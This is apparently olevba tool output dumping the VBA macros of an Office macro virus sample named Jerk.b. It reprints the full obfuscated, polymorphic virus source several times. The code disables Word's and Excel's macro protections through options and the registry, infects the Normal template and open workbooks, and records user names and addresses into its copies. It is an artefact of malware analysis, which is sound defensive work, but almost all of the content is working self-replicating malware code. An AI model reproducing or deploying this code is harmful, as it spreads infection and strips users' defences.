olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-7448dc8151169868f07351f0057dc645a5138ef2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Jerk.b-7448dc8151169868f07351f0057dc645a5138ef2 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0
Dim EEQRPDG, NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
Dim OGZXTPHIPQQ As Boolean
NMOSYIAVKTPWLM = "ThisWorkbook"
EEQRPDG = Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines)
Call NLOYDEC(EEQRPDG)
For UXYIMEIWANP = GMQATL To Application.Workbooks.Count
OGZXTPHIPQQ = DAOGHJCAC
For GNXRKJLB = GMQATL To Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
If Application.Workbooks.Item(UXYIMEIWANP).Path <> "" And Application.Workbooks.Item(UXYIMEIWANP).Saved = ZCZLQJQHTMKY And OGZXTPHIPQQ = DAOGHJCAC Then OGZXTPHIPQQ = ZCZLQJQHTMKY
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then Application.Workbooks.Item(UXYIMEIWANP).Save
Next UXYIMEIWANP
End Sub
Private Sub Document_Close()
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0, GMQATL = 1, XZHDC = wdFormatDocument, FYADBWHMSYHYX = wdFormatTemplate, ZHFRIMGWHH = ":"
Dim OGZXTPHIPQQ, VEJWDG, OOWJIBBZ, MJODT As Boolean
Dim OZBWWGT, VQAQBVFHUQ As Object
Dim FDJMUHIQSWTATK, EEQRPDG As String
If Month(GMQATL * Now) > GMQATL * 2 + GMQATL * 3 And Day(GMQATL * Now) = 4 + GMQATL * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set OZBWWGT = ActiveDocument.VBProject.VBComponents.Item(GMQATL)
Set VQAQBVFHUQ = NormalTemplate.VBProject.VBComponents.Item(GMQATL)
Randomize
OOWJIBBZ = DAOGHJCAC
MJODT = DAOGHJCAC
If OZBWWGT.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then OOWJIBBZ = ZCZLQJQHTMKY
If VQAQBVFHUQ.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then MJODT = ZCZLQJQHTMKY
Options.VirusProtection = DAOGHJCAC
If (OOWJIBBZ = ZCZLQJQHTMKY Xor MJODT = ZCZLQJQHTMKY) And (ActiveDocument.SaveFormat = XZHDC Or ActiveDocument.SaveFormat = FYADBWHMSYHYX) Then
If OOWJIBBZ = ZCZLQJQHTMKY Then
VEJWDG = NormalTemplate.Saved
EEQRPDG = OZBWWGT.CodeModule.Lines(GMQATL, OZBWWGT.CodeModule.CountOfLines)
Call JJPGKBNVXZNSCME(EEQRPDG)
If Int(Rnd * 10 * GMQATL) = GMQATL * 7 Then Call YPQVPZNASUFFVS(EEQRPDG)
Call FKDJUVTV(EEQRPDG)
VQAQBVFHUQ.CodeModule.InsertLines GMQATL, EEQRPDG
If VEJWDG = ZCZLQJQHTMKY Then NormalTemplate.Save
End If
FDJMUHIQSWTATK = Mid(ActiveDocument.FullName, 2, GMQATL)
If MJODT = ZCZLQJQHTMKY And (FDJMUHIQSWTATK = ZHFRIMGWHH Or ActiveDocument.Saved = DAOGHJCAC) Then
OGZXTPHIPQQ = ActiveDocument.Saved
EEQRPDG = VQAQBVFHUQ.CodeModule.Lines(GMQATL, VQAQBVFHUQ.CodeModule.CountOfLines)
Call FKDJUVTV(EEQRPDG)
OZBWWGT.CodeModule.InsertLines GMQATL, EEQRPDG
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then ActiveDocument.Save
End If
End If
End Sub
Private Sub YPQVPZNASUFFVS(ByRef EEQRPDG As String)
On Error Resume Next
Const QIFRBCAZYANQS = 48, PAJIPWJXOHR = 15, TANEYWDERUD = 5, JOVHDK = 65, QJCZV = 90, GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False
Dim KNPDNRGGCNVE, MQLWPEJIQGYUATmp, QOIJHY, MQLWPEJIQGYUA(GMQATL To QIFRBCAZYANQS), MQLWPEJIQGYUA2(GMQATL To QIFRBCAZYANQS) As String
Dim UXYIMEIWANP, GNXRKJLB, UWZPCBHDLHWS As Integer
Dim HDUMVDDNOOD As Boolean
KNPDNRGGCNVE = "EEQRPDG QIFRBCAZYANQS MQLWPEJIQGYUA MQLWPEJIQGYUA2 QOIJHY UXYIMEIWANP GNXRKJLB UWZPCBHDLHWS HDUMVDDNOOD YPQVPZNASUFFVS PAJIPWJXOHR TANEYWDERUD JOVHDK QJCZV GMQATL KNPDNRGGCNVE MQLWPEJIQGYUATmp OGZXTPHIPQQ VEJWDG OOWJIBBZ MJODT OZBWWGT VQAQBVFHUQ JJPGKBNVXZNSCME NPCJIRMM TBQJJOHPNT EBNWT QSCJXIFKUSDSAAK NPCJIRMMTmp OMMILKJBJRNVP FBDLSJBEB FDJMUHIQSWTATK ZCZLQJQHTMKY DAOGHJCAC OYUUUTFBKVJTCOC XZHDC FYADBWHMSYHYX YGPINVKPWHNU CUDQIAAGVQEHSIE ZHFRIMGWHH ESFUL BAYWEHFPE NMOSYIAVKTPWLM NLOYDEC FKDJUVTV KPDOQFIA INFBRLRBOG CMRILYFMYPUGI"
Randomize
GNXRKJLB = GMQATL
For UXYIMEIWANP = GMQATL To Len(KNPDNRGGCNVE)
If Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL) = " " Or UXYIMEIWANP = Len(KNPDNRGGCNVE) Then
If UXYIMEIWANP = Len(KNPDNRGGCNVE) Then MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
For UWZPCBHDLHWS = GMQATL To Int((PAJIPWJXOHR - TANEYWDERUD + GMQATL) * Rnd + TANEYWDERUD)
MQLWPEJIQGYUA2(GNXRKJLB) = MQLWPEJIQGYUA2(GNXRKJLB) & Chr(Int((QJCZV - JOVHDK + GMQATL) * Rnd + JOVHDK))
Next UWZPCBHDLHWS
MQLWPEJIQGYUA(GNXRKJLB) = MQLWPEJIQGYUATmp
MQLWPEJIQGYUATmp = ""
GNXRKJLB = GNXRKJLB + GMQATL
Else
MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
End If
Next UXYIMEIWANP
HDUMVDDNOOD = DAOGHJCAC
For UXYIMEIWANP = GMQATL To Len(EEQRPDG)
For GNXRKJLB = GMQATL To QIFRBCAZYANQS
If Mid(EEQRPDG, UXYIMEIWANP, Len(MQLWPEJIQGYUA(GNXRKJLB))) = MQLWPEJIQGYUA(GNXRKJLB) Then
QOIJHY = QOIJHY & MQLWPEJIQGYUA2(GNXRKJLB)
UXYIMEIWANP = UXYIMEIWANP + Len(MQLWPEJIQGYUA(GNXRKJLB)) - GMQATL
HDUMVDDNOOD = ZCZLQJQHTMKY
Exit For
End If
Next GNXRKJLB
If HDUMVDDNOOD = DAOGHJCAC Then
QOIJHY = QOIJHY & Mid(EEQRPDG, UXYIMEIWANP, GMQATL)
Else
HDUMVDDNOOD = DAOGHJCAC
End If
Next UXYIMEIWANP
EEQRPDG = QOIJHY
End Sub
Private Sub JJPGKBNVXZNSCME(ByRef EEQRPDG As String)
On Error Resume Next
Const QSCJXIFKUSDSAAK = "' ", GMQATL = 1
Const YGPINVKPWHNU = "hh:mm:ss: AMPM - ", CUDQIAAGVQEHSIE = "dddd, d mmm yyyy"
Dim NPCJIRMMTmp, NPCJIRMM, OMMILKJBJRNVP, FBDLSJBEB, TBQJJOHPNT, EBNWT As String
Dim UXYIMEIWANP As Integer
TBQJJOHPNT = Chr(10 * GMQATL + 3)
NPCJIRMM = Application.UserAddress
FBDLSJBEB = Format(Time, YGPINVKPWHNU) & Format(Date, CUDQIAAGVQEHSIE)
EBNWT = Chr(GMQATL * 10)
OMMILKJBJRNVP = Application.UserName
For UXYIMEIWANP = GMQATL To Len(NPCJIRMM)
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> TBQJJOHPNT Then
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> EBNWT Then
NPCJIRMMTmp = NPCJIRMMTmp & Mid(NPCJIRMM, UXYIMEIWANP, GMQATL)
End If
Else
NPCJIRMMTmp = NPCJIRMMTmp & TBQJJOHPNT & QSCJXIFKUSDSAAK
End If
Next UXYIMEIWANP
EEQRPDG = EEQRPDG & TBQJJOHPNT & QSCJXIFKUSDSAAK & FBDLSJBEB & TBQJJOHPNT & QSCJXIFKUSDSAAK & OMMILKJBJRNVP & TBQJJOHPNT & QSCJXIFKUSDSAAK & NPCJIRMM & TBQJJOHPNT
End Sub
Private Sub FKDJUVTV(ByVal EEQRPDG As String)
On Error Resume Next
Dim CMRILYFMYPUGI As Long
Dim ESFUL As Object
Dim KPDOQFIA, INFBRLRBOG As String
KPDOQFIA = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
CMRILYFMYPUGI = &H0
INFBRLRBOG = "Options6"
System.PrivateProfileString("", KPDOQFIA, INFBRLRBOG) = CMRILYFMYPUGI
Set ESFUL = GetObject(, "Excel.Application")
Const GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
NMOSYIAVKTPWLM = "ThisWorkbook"
For UXYIMEIWANP = GMQATL To ESFUL.Application.Workbooks.Count
For GNXRKJLB = GMQATL To ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine 33 * GMQATL, "Private Sub Workbook_Deactivate()"
Else
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
Next UXYIMEIWANP
Set ESFUL = Nothing
End Sub
Private Sub NLOYDEC(ByVal EEQRPDG As String)
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim BAYWEHFPE As Object
Dim VEJWDG As Boolean
Set BAYWEHFPE = GetObject(, "Word.Application")
If BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
VEJWDG = BAYWEHFPE.NormalTemplate.Saved
BAYWEHFPE.Options.VirusProtection = DAOGHJCAC
BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.InsertLines GMQATL, EEQRPDG
If VEJWDG = ZCZLQJQHTMKY Then BAYWEHFPE.NormalTemplate.Save
End If
Set BAYWEHFPE = Nothing
End Sub

' 01:28:26: PM - Wednesday, 10 Feb 1999
' Avert
'


-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Jerk.b-7448dc8151169868f07351f0057dc645a5138ef2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Worksheet_Deactivate()
On Error Resume Next
Const GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0
Dim EEQRPDG, NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
Dim OGZXTPHIPQQ As Boolean
NMOSYIAVKTPWLM = "ThisWorkbook"
EEQRPDG = Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines)
Call NLOYDEC(EEQRPDG)
For UXYIMEIWANP = GMQATL To Application.Workbooks.Count
OGZXTPHIPQQ = DAOGHJCAC
For GNXRKJLB = GMQATL To Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
If Application.Workbooks.Item(UXYIMEIWANP).Path <> "" And Application.Workbooks.Item(UXYIMEIWANP).Saved = ZCZLQJQHTMKY And OGZXTPHIPQQ = DAOGHJCAC Then OGZXTPHIPQQ = ZCZLQJQHTMKY
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then Application.Workbooks.Item(UXYIMEIWANP).Save
Next UXYIMEIWANP
End Sub
Private Sub Document_Close()
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0, GMQATL = 1, XZHDC = wdFormatDocument, FYADBWHMSYHYX = wdFormatTemplate, ZHFRIMGWHH = ":"
Dim OGZXTPHIPQQ, VEJWDG, OOWJIBBZ, MJODT As Boolean
Dim OZBWWGT, VQAQBVFHUQ As Object
Dim FDJMUHIQSWTATK, EEQRPDG As String
If Month(GMQATL * Now) > GMQATL * 2 + GMQATL * 3 And Day(GMQATL * Now) = 4 + GMQATL * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set OZBWWGT = ActiveDocument.VBProject.VBComponents.Item(GMQATL)
Set VQAQBVFHUQ = NormalTemplate.VBProject.VBComponents.Item(GMQATL)
Randomize
OOWJIBBZ = DAOGHJCAC
MJODT = DAOGHJCAC
If OZBWWGT.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then OOWJIBBZ = ZCZLQJQHTMKY
If VQAQBVFHUQ.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then MJODT = ZCZLQJQHTMKY
Options.VirusProtection = DAOGHJCAC
If (OOWJIBBZ = ZCZLQJQHTMKY Xor MJODT = ZCZLQJQHTMKY) And (ActiveDocument.SaveFormat = XZHDC Or ActiveDocument.SaveFormat = FYADBWHMSYHYX) Then
If OOWJIBBZ = ZCZLQJQHTMKY Then
VEJWDG = NormalTemplate.Saved
EEQRPDG = OZBWWGT.CodeModule.Lines(GMQATL, OZBWWGT.CodeModule.CountOfLines)
Call JJPGKBNVXZNSCME(EEQRPDG)
If Int(Rnd * 10 * GMQATL) = GMQATL * 7 Then Call YPQVPZNASUFFVS(EEQRPDG)
Call FKDJUVTV(EEQRPDG)
VQAQBVFHUQ.CodeModule.InsertLines GMQATL, EEQRPDG
If VEJWDG = ZCZLQJQHTMKY Then NormalTemplate.Save
End If
FDJMUHIQSWTATK = Mid(ActiveDocument.FullName, 2, GMQATL)
If MJODT = ZCZLQJQHTMKY And (FDJMUHIQSWTATK = ZHFRIMGWHH Or ActiveDocument.Saved = DAOGHJCAC) Then
OGZXTPHIPQQ = ActiveDocument.Saved
EEQRPDG = VQAQBVFHUQ.CodeModule.Lines(GMQATL, VQAQBVFHUQ.CodeModule.CountOfLines)
Call FKDJUVTV(EEQRPDG)
OZBWWGT.CodeModule.InsertLines GMQATL, EEQRPDG
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then ActiveDocument.Save
End If
End If
End Sub
Private Sub YPQVPZNASUFFVS(ByRef EEQRPDG As String)
On Error Resume Next
Const QIFRBCAZYANQS = 48, PAJIPWJXOHR = 15, TANEYWDERUD = 5, JOVHDK = 65, QJCZV = 90, GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False
Dim KNPDNRGGCNVE, MQLWPEJIQGYUATmp, QOIJHY, MQLWPEJIQGYUA(GMQATL To QIFRBCAZYANQS), MQLWPEJIQGYUA2(GMQATL To QIFRBCAZYANQS) As String
Dim UXYIMEIWANP, GNXRKJLB, UWZPCBHDLHWS As Integer
Dim HDUMVDDNOOD As Boolean
KNPDNRGGCNVE = "EEQRPDG QIFRBCAZYANQS MQLWPEJIQGYUA MQLWPEJIQGYUA2 QOIJHY UXYIMEIWANP GNXRKJLB UWZPCBHDLHWS HDUMVDDNOOD YPQVPZNASUFFVS PAJIPWJXOHR TANEYWDERUD JOVHDK QJCZV GMQATL KNPDNRGGCNVE MQLWPEJIQGYUATmp OGZXTPHIPQQ VEJWDG OOWJIBBZ MJODT OZBWWGT VQAQBVFHUQ JJPGKBNVXZNSCME NPCJIRMM TBQJJOHPNT EBNWT QSCJXIFKUSDSAAK NPCJIRMMTmp OMMILKJBJRNVP FBDLSJBEB FDJMUHIQSWTATK ZCZLQJQHTMKY DAOGHJCAC OYUUUTFBKVJTCOC XZHDC FYADBWHMSYHYX YGPINVKPWHNU CUDQIAAGVQEHSIE ZHFRIMGWHH ESFUL BAYWEHFPE NMOSYIAVKTPWLM NLOYDEC FKDJUVTV KPDOQFIA INFBRLRBOG CMRILYFMYPUGI"
Randomize
GNXRKJLB = GMQATL
For UXYIMEIWANP = GMQATL To Len(KNPDNRGGCNVE)
If Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL) = " " Or UXYIMEIWANP = Len(KNPDNRGGCNVE) Then
If UXYIMEIWANP = Len(KNPDNRGGCNVE) Then MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
For UWZPCBHDLHWS = GMQATL To Int((PAJIPWJXOHR - TANEYWDERUD + GMQATL) * Rnd + TANEYWDERUD)
MQLWPEJIQGYUA2(GNXRKJLB) = MQLWPEJIQGYUA2(GNXRKJLB) & Chr(Int((QJCZV - JOVHDK + GMQATL) * Rnd + JOVHDK))
Next UWZPCBHDLHWS
MQLWPEJIQGYUA(GNXRKJLB) = MQLWPEJIQGYUATmp
MQLWPEJIQGYUATmp = ""
GNXRKJLB = GNXRKJLB + GMQATL
Else
MQLWPEJIQGYUATmp = MQLWPEJIQGYUATmp & Mid(KNPDNRGGCNVE, UXYIMEIWANP, GMQATL)
End If
Next UXYIMEIWANP
HDUMVDDNOOD = DAOGHJCAC
For UXYIMEIWANP = GMQATL To Len(EEQRPDG)
For GNXRKJLB = GMQATL To QIFRBCAZYANQS
If Mid(EEQRPDG, UXYIMEIWANP, Len(MQLWPEJIQGYUA(GNXRKJLB))) = MQLWPEJIQGYUA(GNXRKJLB) Then
QOIJHY = QOIJHY & MQLWPEJIQGYUA2(GNXRKJLB)
UXYIMEIWANP = UXYIMEIWANP + Len(MQLWPEJIQGYUA(GNXRKJLB)) - GMQATL
HDUMVDDNOOD = ZCZLQJQHTMKY
Exit For
End If
Next GNXRKJLB
If HDUMVDDNOOD = DAOGHJCAC Then
QOIJHY = QOIJHY & Mid(EEQRPDG, UXYIMEIWANP, GMQATL)
Else
HDUMVDDNOOD = DAOGHJCAC
End If
Next UXYIMEIWANP
EEQRPDG = QOIJHY
End Sub
Private Sub JJPGKBNVXZNSCME(ByRef EEQRPDG As String)
On Error Resume Next
Const QSCJXIFKUSDSAAK = "' ", GMQATL = 1
Const YGPINVKPWHNU = "hh:mm:ss: AMPM - ", CUDQIAAGVQEHSIE = "dddd, d mmm yyyy"
Dim NPCJIRMMTmp, NPCJIRMM, OMMILKJBJRNVP, FBDLSJBEB, TBQJJOHPNT, EBNWT As String
Dim UXYIMEIWANP As Integer
TBQJJOHPNT = Chr(10 * GMQATL + 3)
NPCJIRMM = Application.UserAddress
FBDLSJBEB = Format(Time, YGPINVKPWHNU) & Format(Date, CUDQIAAGVQEHSIE)
EBNWT = Chr(GMQATL * 10)
OMMILKJBJRNVP = Application.UserName
For UXYIMEIWANP = GMQATL To Len(NPCJIRMM)
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> TBQJJOHPNT Then
If Mid(NPCJIRMM, UXYIMEIWANP, GMQATL) <> EBNWT Then
NPCJIRMMTmp = NPCJIRMMTmp & Mid(NPCJIRMM, UXYIMEIWANP, GMQATL)
End If
Else
NPCJIRMMTmp = NPCJIRMMTmp & TBQJJOHPNT & QSCJXIFKUSDSAAK
End If
Next UXYIMEIWANP
EEQRPDG = EEQRPDG & TBQJJOHPNT & QSCJXIFKUSDSAAK & FBDLSJBEB & TBQJJOHPNT & QSCJXIFKUSDSAAK & OMMILKJBJRNVP & TBQJJOHPNT & QSCJXIFKUSDSAAK & NPCJIRMM & TBQJJOHPNT
End Sub
Private Sub FKDJUVTV(ByVal EEQRPDG As String)
On Error Resume Next
Dim CMRILYFMYPUGI As Long
Dim ESFUL As Object
Dim KPDOQFIA, INFBRLRBOG As String
KPDOQFIA = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
CMRILYFMYPUGI = &H0
INFBRLRBOG = "Options6"
System.PrivateProfileString("", KPDOQFIA, INFBRLRBOG) = CMRILYFMYPUGI
Set ESFUL = GetObject(, "Excel.Application")
Const GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
NMOSYIAVKTPWLM = "ThisWorkbook"
For UXYIMEIWANP = GMQATL To ESFUL.Application.Workbooks.Count
For GNXRKJLB = GMQATL To ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine 33 * GMQATL, "Private Sub Workbook_Deactivate()"
Else
ESFUL.Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
Next UXYIMEIWANP
Set ESFUL = Nothing
End Sub
Private Sub NLOYDEC(ByVal EEQRPDG As String)
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, GMQATL = 1, OYUUUTFBKVJTCOC = 0
Dim BAYWEHFPE As Object
Dim VEJWDG As Boolean
Set BAYWEHFPE = GetObject(, "Word.Application")
If BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
VEJWDG = BAYWEHFPE.NormalTemplate.Saved
BAYWEHFPE.Options.VirusProtection = DAOGHJCAC
BAYWEHFPE.NormalTemplate.VBProject.VBComponents.Item(GMQATL).CodeModule.InsertLines GMQATL, EEQRPDG
If VEJWDG = ZCZLQJQHTMKY Then BAYWEHFPE.NormalTemplate.Save
End If
Set BAYWEHFPE = Nothing
End Sub

' 01:28:26: PM - Wednesday, 10 Feb 1999
' Avert
'


-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Jerk.b-7448dc8151169868f07351f0057dc645a5138ef2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Worksheet_Deactivate()
On Error Resume Next
Const GMQATL = 1, ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0
Dim EEQRPDG, NMOSYIAVKTPWLM As String
Dim UXYIMEIWANP, GNXRKJLB As Integer
Dim OGZXTPHIPQQ As Boolean
NMOSYIAVKTPWLM = "ThisWorkbook"
EEQRPDG = Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(GMQATL).CodeModule.CountOfLines)
Call NLOYDEC(EEQRPDG)
For UXYIMEIWANP = GMQATL To Application.Workbooks.Count
OGZXTPHIPQQ = DAOGHJCAC
For GNXRKJLB = GMQATL To Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Count
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.CountOfLines = OYUUUTFBKVJTCOC Then
If Application.Workbooks.Item(UXYIMEIWANP).Path <> "" And Application.Workbooks.Item(UXYIMEIWANP).Saved = ZCZLQJQHTMKY And OGZXTPHIPQQ = DAOGHJCAC Then OGZXTPHIPQQ = ZCZLQJQHTMKY
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.InsertLines GMQATL, EEQRPDG
If Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).Name = NMOSYIAVKTPWLM Then
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(UXYIMEIWANP).VBProject.VBComponents.Item(GNXRKJLB).CodeModule.ReplaceLine GMQATL * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GNXRKJLB
If OGZXTPHIPQQ = ZCZLQJQHTMKY Then Application.Workbooks.Item(UXYIMEIWANP).Save
Next UXYIMEIWANP
End Sub
Private Sub Document_Close()
On Error Resume Next
Const ZCZLQJQHTMKY = True, DAOGHJCAC = False, OYUUUTFBKVJTCOC = 0, GMQATL = 1, XZHDC = wdFormatDocument, FYADBWHMSYHYX = wdFormatTemplate, ZHFRIMGWHH = ":"
Dim OGZXTPHIPQQ, VEJWDG, OOWJIBBZ, MJODT As Boolean
Dim OZBWWGT, VQAQBVFHUQ As Object
Dim FDJMUHIQSWTATK, EEQRPDG As String
If Month(GMQATL * Now) > GMQATL * 2 + GMQATL * 3 And Day(GMQATL * Now) = 4 + GMQATL * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set OZBWWGT = ActiveDocument.VBProject.VBComponents.Item(GMQATL)
Set VQAQBVFHUQ = NormalTemplate.VBProject.VBComponents.Item(GMQATL)
Randomize
OOWJIBBZ = DAOGHJCAC
MJODT = DAOGHJCAC
If OZBWWGT.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then OOWJIBBZ = ZCZLQJQHTMKY
If VQAQBVFHUQ.CodeModule.CountOfLines <> OYUUUTFBKVJTCOC Then MJODT = ZCZLQJQHTMKY
Options.VirusProtection = DAOGHJCAC
If (OOWJIBBZ = ZCZLQJQHTMKY Xor MJODT = ZCZLQJQHTMKY) And (ActiveDocument.SaveFormat = XZHDC Or ActiveDocument.SaveFormat = FYADBWHMSYHYX) Then
If OOWJIBBZ = ZCZLQJQHTMKY Then
VEJWDG = NormalTemplate.Saved
EEQRPDG = OZBWWGT.CodeModule.Lines(GMQATL, OZBWWGT.CodeModule.CountOfLines)
Call JJPGKBNVXZNSCME(EEQRPDG)
If Int(Rnd * 10 * GMQATL) = GMQATL * 7 Then Call YPQVPZNASUFFVS(EEQRPDG)
Call FKDJUVTV(EEQRPDG)
VQAQBVFHUQ.CodeModule.InsertLines GMQATL, EEQRPDG
